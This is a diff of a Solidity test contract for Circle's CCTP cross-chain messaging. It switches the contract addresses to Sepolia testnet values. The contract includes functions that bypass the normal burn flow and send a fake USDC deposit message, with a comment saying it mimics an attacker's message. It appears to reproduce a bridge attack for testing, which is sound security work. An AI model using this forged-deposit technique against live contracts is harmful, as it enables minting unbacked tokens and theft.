@@ -21,21 +21,22 @@ interface ITokenMessenger {
 }
 
 contract CCTPMessageTest is Ownable {
-    // MessageTransmitterV2 Address (same across all EVM chains)
-    IMessageTransmitter public constant messageTransmitter = 
-        IMessageTransmitter(0x0eb340E74b09c2CE87AFCD8b8C156f081432f5c1);
-    
-    // TokenMessengerV2 Address (same across all EVM chains)
-    ITokenMessenger public constant tokenMessenger = 
-        ITokenMessenger(0x12b7546E3A678bd317f25979C6F676Be1b759604);
-    
-    // USDC Address (example on Ethereum mainnet)
-    address public constant usdc = 0xA0b86a33E6441e8c8C8c8c8c8c8c8c8c8c8c8c8;
-    
+    // MessageTransmitterV2 Address (Sepolia)
+    IMessageTransmitter public constant messageTransmitter =
+        IMessageTransmitter(0xE737e5cEBEEBa77EFE34D4aa090756590b1CE275);
+
+    // TokenMessengerV2 Address (Sepolia)
+    ITokenMessenger public constant tokenMessenger =
+        ITokenMessenger(0x8FE6B999Dc680CcFDD5Bf7EB0974218be2542DAA);
+
+    // USDC Address (Sepolia USDC)
+    address public constant usdc =
+        0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238;
+
     event MessageSent(uint64 nonce, bytes message);
-    
+
     constructor() {}
-    
+
     // Function to send a message directly through MessageTransmitter
     // This bypasses TokenMessenger.depositForBurn() entirely
     function sendDirectMessage(
@@ -49,11 +50,11 @@ contract CCTPMessageTest is Ownable {
             recipientAddress,
             arbitraryMessage
         );
-        
+
         emit MessageSent(nonce, arbitraryMessage);
         return nonce;
     }
-    
+
     // Function to create a fake USDC deposit message
     // This mimics what the attacker would have sent
     function sendFakeUSDCDeposit(
@@ -68,18 +69,18 @@ contract CCTPMessageTest is Ownable {
             fakeAmount,          // amount (fake)
             recipientAddress     // mint recipient
         );
-        
+
         // Send directly through MessageTransmitter
         nonce = messageTransmitter.sendMessage(
             destinationDomain,
             recipientAddress,
             fakeDepositMessage
         );
-        
+
         emit MessageSent(nonce, fakeDepositMessage);
         return nonce;
     }
-    
+
     // Function to demonstrate the normal flow through TokenMessenger
     function sendNormalDeposit(
         uint256 amount,
@@ -93,7 +94,7 @@ contract CCTPMessageTest is Ownable {
             mintRecipient,
             usdc
         );
-        
+
         emit MessageSent(nonce, abi.encode(usdc, amount, mintRecipient));
         return nonce;
     }
